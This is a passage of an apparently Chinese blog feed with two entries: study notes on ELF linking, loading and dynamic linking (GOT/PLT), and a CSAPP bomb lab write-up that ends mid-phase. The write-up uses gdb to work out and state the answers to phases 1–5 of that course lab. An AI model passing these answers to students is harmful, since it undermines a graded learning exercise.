sh_addralign;<span class="comment">//段地址对齐</span></span><br><span class="line">    Elf32_Word sh_entsize;<span class="comment">//项的长度</span></span><br><span class="line">&#125;Elf32_Shdr;</span><br></pre></td></tr></table></figure><p>段的类型(<code>sh_type</code>)</p><p><img src="https://i.loli.net/2021/04/11/y1Sl8J2XOjUfKVC.png" alt="image-20210411000535505"></p><p><img src="https://i.loli.net/2021/04/11/sELGUIJ8XVjuYfN.png" alt="image-20210411000541281"></p><p>段的标志位(<code>sh_flags</code>)</p><p><img src="https://i.loli.net/2021/04/11/PrTfJvd28xKp9WA.png" alt="image-20210411000612666"></p><p>系统保留段</p><p><img src="https://i.loli.net/2021/04/11/KgHyCYBbEnV4iuR.png" alt="image-20210411000721838"></p><p><img src="https://i.loli.net/2021/04/11/B7eAaIJjpgC9Oil.png" alt="image-20210411000728065"></p><p>段的链接信息(<code>sh_link</code>、<code>sh_info</code>)</p><p><img src="https://i.loli.net/2021/04/11/2QEWdskv8ANxpne.png" alt="image-20210411000848895"></p><p>&lt;————————————分割线————————————&gt;</p><p>ELF文件把字符串集中存放在一个表中，然后使用字符串在表中的偏移引用字符串。常见段名为<code>.strtab</code>或<code>.shstrtab</code>，分别为字符串表和段表字符串表，一个用来保存普通字符串，一个用来保存段表中用到的字符串，最常见的如段名。</p><h3 id="C-链接的接口-符号"><a href="#C-链接的接口-符号" class="headerlink" title="C.链接的接口-符号"></a>C.链接的接口-符号</h3><p>每个函数或变量都有自己独特的名字，这样能避免链接过程中不同变量和函数之间的混淆。我们将函数和变量统称为符号，函数名或变量名就是符号名。</p><p>每个目标文件有一个符号表，里面记录了目标文件中用到的符号。每个函数和变量的符号值都是它们的地址。</p><p>还有几个其它的符号:</p><ul><li>全局符号，可以被其他目标文件引用</li><li>在本目标文件引用的全局符号，被称为外部符号</li><li>段名，由编译器产生，值是该段的起始地址</li><li>局部符号，对编译过程没有作用，编译器往往忽略。</li><li>行号信息，目标文件指令和源代码中代码行的对应关系</li></ul><p>我们值得关注的是全局符号，其它对链接是无关紧要的，因为它们对其他目标文件来说是不可见的。</p><p>&lt;————————————分割线————————————&gt;</p><p>符号表结构</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Word st_name;<span class="comment">//符号名</span></span><br><span class="line">    Elf32_Addr st_value;<span class="comment">//符号值</span></span><br><span class="line">    Elf32_Word st_size;<span class="comment">//符号的数据类型大小</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;<span class="comment">//符号类型和绑定信息</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;<span class="comment">//没用，默认0</span></span><br><span class="line">    Elf32_Half st_shndx;<span class="comment">//符号所在段</span></span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure><p>符号类型和绑定信息<code>st_info</code>，该成员低4位表示符号类型，高28位表示符号绑定信息</p><p><img src="https://i.loli.net/2021/04/11/wUohbDBC5PzpW3T.png" alt="image-20210411153704495"></p><p>符号所在段<code>st_shndx</code></p><p><img src="https://i.loli.net/2021/04/11/DL3mr9fVkTWJby4.png" alt="image-20210411153836320"></p><p>符号值<code>st_value</code>，根据符号确定符号值，如果符号是个函数或者变量，符号值则是它的地址。</p><ul><li>在目标文件中，如果符号不是COMMON块的(<code>st_shndx</code>不为SHN_COMMON)，则符号值表示该符号在段中的偏移。</li><li>在目标文件中，如果符号是COMMON类型的，则符号值表示该符号的对齐属性</li><li>在可执行文件中，符号值表示符号的虚拟地址。</li></ul><p>&lt;————————————分割线————————————&gt;</p><p>特殊符号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__executable_start程序起始地址</span><br><span class="line">__etext或_etext或etext代码段结束地址</span><br><span class="line">_end或end程序结束地址</span><br></pre></td></tr></table></figure><p>我们可以在程序中直接使用这些符号</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> etext[];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;etext:%d&quot;</span>,etext);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&lt;————————————分割线————————————&gt;</p><p>为了防止符号名冲突，不同语言的符号名规格也不一样，例如C语言的符号会在名字前面加上下划线，而Fortran语言会在前后都加上下划线。但是仍然会有符号名重复的事情，所以C++增加了<code>namespace</code>来解决冲突问题。</p><p>随着时间推移，Linux下的GCC编译器已经去掉了在C语言前加下划线的方式，但是Windows平台下的版本还会加下划线。</p><p>C++为了区分函数重载，发明了<strong>符号修饰</strong>的机制：</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">func</span><span class="params">(<span class="keyword">float</span>)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C2</span>&#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span> N&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">C</span>&#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数签名:函数签名包含了一个函数的信息，包括函数名，参数类型，所在的类和namespace及其他信息。</p><p>编译器将C++源代码编译成目标文件时，会将函数和变量名修饰后，再形成符号名。</p><p><img src="https://i.loli.net/2021/04/11/Y9LTOv2jflVnCBb.png" alt="image-20210411235604744"></p><blockquote><p>GCC的基本C++修饰方法如下：所有符号以<code>_Z</code>开头。然后嵌套的名字(在名称空间或在类里的)紧跟一个<code>N</code>，再以E结尾。每个名字前是名字字符串的长度，对于函数来说，它的参数列表紧跟在E后面，例如int类型就是i。</p><p><code>c++filt</code>这个工具可以用来解析被修饰过的名称</p></blockquote><p>全局变量和静态变量也会被修饰。不同编译器的修饰方法也是不同的。</p><h2 id="第四章-静态链接"><a href="#第四章-静态链接" class="headerlink" title="第四章 静态链接"></a>第四章 静态链接</h2><p>Q.对于多个输入目标文件，链接器如何将它们的各个段合并到输出文件？</p><ol><li>第一种方法是将输入的目标文件按次序叠加，但是缺点是目标文件很多的情况下，输出文件会有很多零散的段。因为对齐的原因，所以会浪费大量空间。</li><li>第二种方法是将相同性质的段合并在一起，现在的链接器也一般使用这种方法。使用这个方法的链接器一般采用一种<strong>两步链接</strong>的方法：第一步，<strong>空间与地址分配</strong>。扫描输入的目标文件，获取它们各个段的属性，将它们合并。并将符号表的所有符号定义和符号引用收集起来，统一放到一个全局符号表；第二步，使用上一步收集到的信息，进行<strong>符号解析与重定位</strong>。</li></ol><p>重定位表：</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Addr r_offset;</span><br><span class="line">    Elf32_Word r_info;</span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/12/Gspf9rNW1wjuXxP.png" alt="image-20210412143117240"></p><p><img src="https://i.loli.net/2021/04/12/FNZWBIsqAS4fLoc.png" alt="image-20210412145215215"></p><p>绝对地址修正和相对寻址修正的区别就是绝对寻址修正后的地址为该符号的实际地址；相对寻址修正后的地址为符号距离被修正位置的地址差。</p><h3 id="A-COMMON块"><a href="#A-COMMON块" class="headerlink" title="A.COMMON块"></a>A.COMMON块</h3><p>强符号：编译器默认函数和已经初始化的全局变量</p><p>弱符号：未初始化的全局变量</p><p>现在的编译器和链接器支持COMMON块（Common Block）机制。COMMON类型的链接规则是针对符号都是弱符号的情况。如果其中有一个强符号，最终符号所占空间与强符号相同。如果有弱符号大小大于强符号，链接器报警告。</p><p>COMMON块解决了一个弱符号定义在多个目标文件类型不同的问题。如果出现多个弱符号，两个文件链接后以最大的弱符号为准，例如是double类型，所占空间就为8个字节。</p><p>因为弱符号最终所占空间大小是未知的，所以无法为弱符号在BSS段分配空间。但是在链接器读取所有输入文件后，弱符号的大小就可以确定，所以还是存放在BSS段。</p><h3 id="B-C-相关问题"><a href="#B-C-相关问题" class="headerlink" title="B.C++相关问题"></a>B.C++相关问题</h3><p><strong>重复代码消除</strong>：C++编译器在很多时候会产生重复的代码，比如模板，外部内联函数和虚函数表等等，都有可能在不同的编译单元里生成相同的代码。为了防止空间浪费等等问题，我们把这些代码单独存放在一个段里，每个段只包含一个，最后合并代码段时去掉重复的。</p><p><strong>函数级别链接</strong>：由于现在的库和程序都很大，我们把函数单独保存到一个段里面，当我们用到的时候，把函数所在的段链接到输出文件就可以了。</p><p><strong>全局构造与析构</strong>：Linux系统下程序的入口是<code>_start</code>，这个函数是Glibc的一部分，当这个函数完成一系列初始化之后，才会调用main函数执行程序。main函数执行完后，又返回到<code>_start</code>，进行析构。除了这些以外，C++的全局构造和析构，也在main函数之前和之后执行。</p><ul><li><code>.init</code>该段保存可执行指令，构成进程的初始代码，在main函数调用之前，Glibc的初始化部分安排执行这个段的代码。</li><li><code>.fini</code>该段保存进程终止代码指令，当main函数正常退出时，Glibc会执行这个段指令。</li></ul><h2 id="第五章-Windows-PE-COFF"><a href="#第五章-Windows-PE-COFF" class="headerlink" title="第五章 Windows PE/COFF"></a>第五章 Windows PE/COFF</h2><p>之前写过PE相关的：<a href="https://kazamayc.github.io/2020/09/21/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-PE/">链接</a>，所以这章快进着看了</p><p>VC++编译器产生的目标文件格式是COFF，可执行文件格式是PE</p><blockquote><p>因为PE文件在装载时被直接映射到进程的虚拟空间中运行，它是进程的虚拟空间的映像，所以PE可执行文件很多时候被叫做Image File.</p></blockquote><p>本章主要讲了讲COFF文件格式，目前对其没什么兴趣，等之后用到再回来翻书。</p><h1 id="0x03-装载与动态链接"><a href="#0x03-装载与动态链接" class="headerlink" title="0x03 装载与动态链接"></a>0x03 装载与动态链接</h1><h2 id="第六章-可执行文件的装载与进程"><a href="#第六章-可执行文件的装载与进程" class="headerlink" title="第六章 可执行文件的装载与进程"></a>第六章 可执行文件的装载与进程</h2><h3 id="A-虚拟地址空间-Virtual-Address-Space"><a href="#A-虚拟地址空间-Virtual-Address-Space" class="headerlink" title="A.虚拟地址空间(Virtual Address Space)"></a>A.虚拟地址空间(Virtual Address Space)</h3><p>1.程序和进程的区别：程序是一个静态的概念，它是一些预先编译好的指令和数据集合的一个文件；进程则是一个动态的概念，它是程序运行时的过程。</p><p>2.虚拟地址空间的大小由CPU的位数决定，例如32位CPU有32位寻址能力，也就是4GB虚拟空间大小。</p><p>3.我们可以通过指针来判断虚拟空间位数，32位下的指针为32位，也就是4字节；64位下的指针为64位，8字节。</p><p>4.程序不能任意使用操作系统分配的虚拟空间，只能使用操作系统分配给进程的地址，如果访问未经允许的空间，操作系统会捕获访问并强制结束进程。<br>这里以32位举例，4GB会被分成两部分，从<code>0xC0000000</code>到<code>0xFFFFFFFF</code>这1GB由操作系统使用，剩下的从<code>0x00000000</code>到<code>0xBFFFFFFF</code>这3GB由进程使用。但其实这3GB进程也不能完全使用(太惨了)。</p><p>4.PAE(Physical Address Extension)：物理地址扩展，Intel改进CPU，扩展到36位地址线，可以映射更多内存。</p><h3 id="B-装载的方式"><a href="#B-装载的方式" class="headerlink" title="B.装载的方式"></a>B.装载的方式</h3><p>1.动态装入的基本原理：将程序常用的部分放在内存，不常用数据放在磁盘里面。</p><p>2.<strong>覆盖装入</strong>在早期没有虚拟存储时使用比较广泛，现在已经被淘汰了。覆盖装入的方法是让程序员将程序分割，然后写辅助代码来管理这些程序何时驻留内存何时被替换，这个辅助代码就是所谓的覆盖管理器。</p><p>3.<strong>页映射</strong>：程序把磁盘中的所有数据和指令按照页为单位划分成若干个页，以后所有的装载和操作的单位就是页。</p><p>4.页映射采用先进先出，最少使用算法。</p><h3 id="C-从操作系统的角度看可执行文件的装载"><a href="#C-从操作系统的角度看可执行文件的装载" class="headerlink" title="C.从操作系统的角度看可执行文件的装载"></a>C.从操作系统的角度看可执行文件的装载</h3><p>进程的建立：</p><ol><li>创建一个独立的虚拟地址空间</li><li>读取可执行文件头，建立虚拟空间和可执行文件的映射</li><li>将CPU的指令寄存器设置成可执行文件的入口地址</li></ol><p>Linux将进程虚拟空间中的一个段叫做虚拟内存区域(VMA, Virtual Memory Area)，在Windows里叫虚拟段(Virtual Section)</p><p><strong>页错误</strong>：当程序试图访问已映射在虚拟地址空间中，但是目前未被加载到物理内存，由中央处理器的内存管理单元所发出的中断。操作系统通过页错误来把虚拟地址空间加载到物理内存去执行。</p><p><img src="https://i.loli.net/2021/04/15/OrlkD2T4JAumHCY.png" alt="image-20210415184340491"></p><p>理解：计算机把可执行程序拉伸到虚拟地址空间，然后分页，实际的内存需要哪页，就给它哪页。</p><h3 id="D-进程的虚拟存储空间分布"><a href="#D-进程的虚拟存储空间分布" class="headerlink" title="D.进程的虚拟存储空间分布"></a>D.进程的虚拟存储空间分布</h3><p>1.操作系统不关心各个段的内容，只关心段的权限(可读可写可执行)。为了避免空间浪费，<strong>我们将相同权限的段合并到一起当作一个段进行映射</strong>，这种合成的段被看作是一个<code>Segment</code>，减少对齐导致的空间浪费(因为是先合并，然后再映射)。</p><blockquote><p>举个例子，<code>.text</code>被单独映射到一个虚拟段，<code>.data</code>也被单独映射到一个虚拟段，但如果他们两个权限相同，可以先把他俩合并成一个段，也就是Segment，然后再映射到虚拟段，这样可以节省内存。</p></blockquote><p>描述section属性的叫做段表，描述segment的程序叫程序头表。</p><p>ELF可执行文件中有一个专门的数据结构保存Segment的信息。</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Word p_type;<span class="comment">//Segment类型</span></span><br><span class="line">Elf32_Off p_offset;<span class="comment">//在文件中的偏移</span></span><br><span class="line">Elf32_Addr p_vaddr;<span class="comment">//第一个字节在进程虚拟地址空间的起始位置</span></span><br><span class="line">    Elf32_Addr p_paddr;<span class="comment">//物理地址</span></span><br><span class="line">    Elf32_Word p_filesz;<span class="comment">//在ELF文件中占空间的长度</span></span><br><span class="line">    Elf32_Word p_memsz;<span class="comment">//在虚拟空间中占用的长度</span></span><br><span class="line">    Elf32_Word p_flags;<span class="comment">//权限属性RWX</span></span><br><span class="line">    Elf32_Word p_align;<span class="comment">//对齐属性，实际对其字节是2的p_align次，比如p_align等于10，那么实际对齐属性就是2的10次方</span></span><br><span class="line">&#125;Elf32_Phdr;</span><br></pre></td></tr></table></figure><p>2.操作系统通过给进程空间划分出一个个的VMA来管理进程的虚拟空间，基本原则是将相同权限属性、有相同映像文件的映射成一个VMA。</p><p><img src="https://i.loli.net/2021/04/15/8LsH3SEDkzxNKaX.png" alt="image-20210415200652636"></p><p>3.进程在启动时，需要知道一些进程运行的环境，最基本的就是系统环境变量和进程的运行参数。很常见的一种做法是操作系统在进程启动前将这些信息保存到进程的虚拟空间的栈中。</p><h3 id="E-Linux内核装载ELF过程"><a href="#E-Linux内核装载ELF过程" class="headerlink" title="E.Linux内核装载ELF过程"></a>E.Linux内核装载ELF过程</h3><p>Q.当我们在bash下输入命令执行ELF程序时，Linux系统会怎么做呢？</p><p>A：首先在用户层面上，bash进程会调用fork()系统调用创建一个新的进程，然后新的进程调用execve()系统调用执行指定的ELF文件，原先的bash进程返回等待启动的进程结束。<br>在内核中，execve()系统调用sys_execve()对参数进行检查复制，然后调用do_execve()查找被执行的文件，如果找到文件就读取文件的前128字节(用以接下来判断文件的格式)。然后调用search_binary_handle()去搜索和匹配合适的可执行文件装载处理过程，search_binary_handle()会判断文件格式，调用相应的装载处理过程。比如ELF就会调用load_elf_binary()，a.out就调用load_aout_binary()。</p><p>load_elf_binary()的步骤是：</p><ol><li>检查ELF可执行文件格式的有效性</li><li>寻找动态链接<code>.interp</code>段，设置动态链接器路径</li><li>根据ELF可执行文件的程序头表的描述，对ELF文件进行映射</li><li>初始化ELF进程环境</li><li>将系统调用的返回地址修改成ELF可执行文件的入口点</li></ol><p>当load_elf_binary()执行完毕，返回至do_execve()再返回至sys_execve()，系统调用的返回地址已经被修改成ELF的入口地址，这时EIP寄存器跳转到入口地址，新的程序开始执行。</p><h3 id="F-Windows-PE的装载"><a href="#F-Windows-PE的装载" class="headerlink" title="F.Windows PE的装载"></a>F.Windows PE的装载</h3><p>Windows不需要考虑ELF多段地址对齐之类的问题，虽然会浪费一些磁盘和内存，不过PE的段一般比较少，不像ELF中有很多，最后还要用Segment把它们合并到一起装载。</p><p>PE的装载过程：</p><ol><li>先读取文件第一个页</li><li>检查进程地址空间中，目标地址是否可用。不可用就选另一个装载地址。这个问题对可执行文件基本上不存在，因为它往往是进程第一个装入的模块，主要针对于DLL文件的装载。</li><li>使用段表中提供的信息，将PE文件中的所有段一一映射到地址空间</li><li>如果装载地址不是目标地址，则进行重定位</li><li>装载所有PE文件所需要的DLL文件</li><li>对PE文件中的所有导入符号进行解析</li><li>根据PE头中指定的参数建立初始化栈和堆</li><li>建立主线程并启动</li></ol><h2 id="第七章-动态链接"><a href="#第七章-动态链接" class="headerlink" title="第七章 动态链接"></a>第七章 动态链接</h2><p>1.静态链接的缺点是浪费内存和磁盘空间，模块更新困难。</p><p>2.动态链接的基本思想是把程序按照模块分成各个独立的部分，在程序运行时将它们链接在一起，而不是像静态链接一样把所有的程序模块都链接成一个单独的可执行文件。</p><p>3.动态链接优点：能够节省内存，有更好的程序扩展性和兼容性。</p><p>4.动态链接的缺点：当程序依赖某个模块更新后，由于新的模块和旧的模块不兼容，导致程序无法运行，也被称为DLL Hell。</p><p>5.如果a函数是一个定义在其他静态模块的函数，那么链接器会将a函数的地址重定位；如果a函数是一个定义在动态共享对象的函数，那么链接器就会将这个符号标记为一个动态链接的符号，不对它进行地址重定位，把这个过程留到装载时再进行。</p><p>6.可执行文件基本可以确定自己再进程虚拟空间的起始位置，Linux下一般是0x08040000，Windows下一般是0x0040000。</p><p>7.**地址无关代码(PIC)**：希望程序模块中共享的指令部分在装载时不需要因为装载地址的改变而改变，所以实现的基本想法就是把指令中那些需要被修改的部分分离出来，跟数据部分放在一起，这样指令的部分就可以保持不变，而数据部分可以在每个进程中拥有一个副本。</p><p>8.**全局偏移表GOT(Global Offset Table)**是链接器在执行链接时实际上要填充的部分， 保存了所有外部符号的地址信息。动态链接时，因为不知道模块加载位置，将地址相关代码抽出，放在数据段中就是got表。</p><p>9.<strong>延迟绑定(Lazy Binding)<strong>：当函数第一次被用到时才进行绑定。能加快速度，因为有些函数不会用到。</strong>绑定需要进行符号查找和重定位，如果用延迟绑定就不需要把所有的函数进行绑定了。</strong></p><p>10.**PLT(Procedure Linkage Table)**：ELF使用PLT的方法进行延迟绑定，PLT为了实现延迟绑定，当调用外部模块的函数时，不直接通过GOT表进行间接跳转，而是在这个过程中又加了一层间接跳转PLT表。</p><p><img src="https://i.loli.net/2021/04/22/N7TknDldQ9zPVfv.png" alt="image-20210422005334405"></p><p>PLT将GOT拆分成了两个表叫做”<code>.got</code>“和”<code>.got.plt</code>“，<code>.got</code>用来保存全局变量引用的地址，<code>.got.plt</code>用来保存函数引用的地址。</p><p>对应这篇文章一起理解,<a href="https://aidaip.github.io/binary/2019/10/25/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html">https://aidaip.github.io/binary/2019/10/25/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html</a></p><p>11.生成动态链接库<code>gcc -fPIC -shared demo.c demo.so</code></p><p>12.静态链接下，操作系统可以直接把控制权交给可执行文件的入口地址，然后程序开始执行。但是动态链接下，操作系统会启动动态链接器<code>ld.so</code>，当所有动态链接工作完成之后，才会把控制权交给可执行文件的入口。</p><p>13.<code>.inertp</code>段保存了一个字符串，这个字符串就是可执行文件所需要的动态链接器的路径。</p><p>14.<code>.dynamic</code>段保存了动态链接所需要的基本信息。</p><p>15.<code>.rel.dyn</code>表示代码段(修正<code>.got</code>)的重定位表，<code>.rel.data</code>是数据段(修正<code>.got.plt</code>)的重定位表。</p><p>16.动态链接步骤：启动动态链接器，动态链接器自己把自己本身的函数进行重定位。接下来把符号表合并到一个里面，然后装载所有需要的共享对象，最后重定位和初始化。</p>]]></content>
      
      
      <categories>
          
          <category> 2021年3月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[实验] csapp_lab</title>
      <link href="/2021/02/05/csapp-lab/"/>
      <url>/2021/02/05/csapp-lab/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-bomb-lab"><a href="#0x01-bomb-lab" class="headerlink" title="0x01 bomb lab"></a>0x01 bomb lab</h1><p>#如果有写错的或不懂的，欢迎加我讨论一下<br>#后面几个因为挺难注释写的挺乱的，建议不要看自己调试一遍，调不出看看总结的思路即可</p><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p>因为本题需要用gdb，于是先去琢磨了一下gdb的使用。</p><p>上来先把汇编导出来</p><p><img src="https://i.loli.net/2021/02/05/XIt1F2Q5pqlwa3U.png" alt="image-20210205004018515"></p><p>然后拖到vscode里，找到第一个函数，然后简单分析一下</p><p><img src="https://i.loli.net/2021/02/05/x57HKdpMYf1Zyu9.png" alt="image-20210205004931811"></p><p>然后打开gdb在比较字符串的地方设置断点，然后运行，运行后随便输入，进入断点。</p><p><img src="https://i.loli.net/2021/02/05/k4KWpsaiyGmx5ZY.png" alt="image-20210205005109996"></p><p>然后查看第一个参数rdi的内容，发现是我们输入的参数</p><p><img src="https://i.loli.net/2021/02/05/DNIdzfihS1coQtr.png" alt="image-20210205005553988"></p><p>于是推测esi中的数据是用来跟我们输入的数据比较的</p><p><img src="https://i.loli.net/2021/02/05/giomXZ2EC9shrAq.png" alt="image-20210205005707665"></p><p>然后测试</p><p>Border relations with Canada have never been better.</p><p><img src="https://i.loli.net/2021/02/06/VEQNXFMmoeShHry.png" alt="image-20210206230552676"></p><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>首先看汇编推测是读取6个数字</p><p><img src="https://i.loli.net/2021/02/06/QUk9olvITt4EOB8.png" alt="image-20210206231007803"></p><p>然后读读汇编会发现第一个数是1，第二数在rax里，剩下的数是个等比数列</p><p><img src="https://i.loli.net/2021/02/07/3fhXO4VdS6Usomr.png" alt="image-20210207010610656"></p><p>也就是1 2 4 8 16 32</p><p><img src="https://i.loli.net/2021/02/07/f14kcDj8LSUoZIC.png" alt="image-20210207010740967"></p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p><img src="https://i.loli.net/2021/02/07/2vRFdq5ykm8EZ3n.png" alt="image-20210207012840994"></p><p>带入0测试一下，看看0x402470里面存放的值</p><p><img src="https://i.loli.net/2021/02/07/ZUTRuNsjPh7vB6A.png" alt="image-20210207012828613"></p><p><img src="https://i.loli.net/2021/02/07/5BjNkfWHqQ6y9xZ.png" alt="image-20210207013249509"></p><p>于是接着分析</p><p><img src="https://i.loli.net/2021/02/07/HwkVipgXe8R7Zt3.png" alt="image-20210207015926457"></p><p>两个数是0 207</p><p><img src="https://i.loli.net/2021/02/07/VqeHIx63RJ2f5Bu.png" alt="image-20210207020029327"></p><p>搞定</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><p><img src="https://i.loli.net/2021/02/11/LeKA6uFgCVEJTsq.png" alt="image-20210211013148726"></p><p><img src="https://i.loli.net/2021/02/11/3Vv9SpYODMsiQco.png" alt="image-20210211013159583"></p><p>所以答案应该是7 0</p><p><img src="https://i.loli.net/2021/02/11/ehv6HSp37iAERdX.png" alt="image-20210211013357678"></p><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>第五关只看汇编做不出来，要接着上gdb（下面几个有点复杂，写的废话有点多，见谅见谅QAQ</p><p>先粗略分析一下</p><p><img src="https://i.loli.net/2021/02/11/Pil3wREdTGjsH2t.png" alt="image-20210211144109197"></p><p>查看用于比较的字符串是”<code>flyers</code>“</p><p><img src="https://i.loli.net/2021/02/11/jrZh6xg7MNonzE4.png" alt="image-20210211144522857"></p><p>结果爆炸了</p><p><img src="https://i.loli.net/2021/02/11/bOPNM3uKtB9zjr1.png" alt="image-20210211144807960"></p><p>设个断点调一下</p><p><img src="https://i.loli.net/2021/02/11/jpOLZFTeE7YVC5J.png" alt="image-20210211164833577"></p><p>rbx中是我们输入的值</p><p><img src="https://i.loli.net/2021/02/11/zHDwMV2jAGylU6X.png" alt="image-20210211165134962"></p><p>然后就可以接着推源代码了</p><p><img src="https://i.loli.net/2021/02/11/NVr7R62OoyXeDwd.png" alt="image-20210211173117782"></p><p>然后看一看0x4024b0地址中存的东西</p><p><img src="https://i.loli.net/2021/02/11/ftPrS7qIZiBGAvO.png" alt="image-20210211173439286"></p><p>然后因为太菜，一步一步的测试分析的，写的可能有点多，思路都在注释里了</p><p><img src="https://i.loli.net/2021/02/11/deXcC1GNnE6HVoY.png" alt="image-20210211195320442"></p><p>经过俺的反复理解，这里应该是要用0x4024b0处的字符串凑出flyers这个值即可(大概x</p><p>然后只要研究一下如何让咱输入的值满足这个条件即可</p><p>话说edx的值大概是索引1，f需要的值是9，l是15，y是14，e是5，r是6，s是7</p><p>所以需要的值大概是让输入每个字符的ascii的值后四位为9FE567</p><p>查查ASCII码表 用 9ON567测试一下</p><p><img src="https://i.loli.net/2021/02/11/VrDb2qoKz6ZXch3.png" alt="image-20210211201145392"></p><p><img src="https://i.loli.net/2021/02/11/EazZkcw91jJMNem.png" alt="image-20210211200851162"></p><p>成了，泪目</p><p>备注：0x401096注释部分是错的，是我在分析时没注意abcdef，后面换了几个值测试才成功，记得下次测试时用点特殊值</p><p><img src="https://i.loli.net/2021/02/11/cNw8ePyRIgQ54lk.png" alt="image-20210211202857311"></p><p>这里值还是很奇怪，不过只要看最后8位就能看出答案</p><p><img src="https://i.loli.net/2021/02/11/KXtT2g6FHNUC4EA.png" alt="image-20210211202942318"></p><p>变成9啦，前面应该是把寄存器之前的值加进去了</p><p>然后再读一遍代码就能懂啦，简单哒</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>这个还挺复杂的，主要是理清楚逻辑（犯了一个低级错误导致浪费了两天才调出来，但这个其实并不难，调试一下就出来了</p><p>经过上个的教训，输入些不规则的数</p><p><img src="https://i.loli.net/2021/02/11/ALvQRa7dU2SuKGZ.png" alt="image-20210211204818126"></p><p>栈中是我们输入的参数</p><p><img src="https://i.loli.net/2021/02/11/FJcUleM32tmQduP.png" alt="image-20210211205338947"></p><p>最终分析大概是这样：</p><p><img src="https://i.loli.net/2021/02/13/unXchFOzEL6Dfxl.png" alt="image-20210213003347640"></p><p>其实也不用看我的注释，前面主要就是让你输入6个参数，且6个参数需要&gt;=1且&lt;=6，并且不能相同。</p><p>直接输入654321会爆炸，不过为了测试下面代码，先把输入的值改成654321</p><p><img src="https://i.loli.net/2021/02/11/Fa7RCSmDYth3xjN.png" alt="image-20210211223154741"></p><p><img src="https://i.loli.net/2021/02/13/nyTPcoOJU3iQlaR.png" alt="image-20210213012115782"></p><p>这里是把<code>0x6032d0（332 1 6）</code> <code>0x6032e0（168 2 5）</code> <code>0x6032f0（924 3 4）</code> <code>0x603300（691 4 3）</code> <code>0x603310（477 5 2）</code> <code>0x603320（443 6 1）</code>共6个地址按照你输入的顺序放到栈上</p><p><img src="https://i.loli.net/2021/02/13/IB51k2zOh38bVv7.png" alt="image-20210213015400190"></p><p>因为我们输入的是654321</p><p>所以栈中应该是这样的：</p><p><img 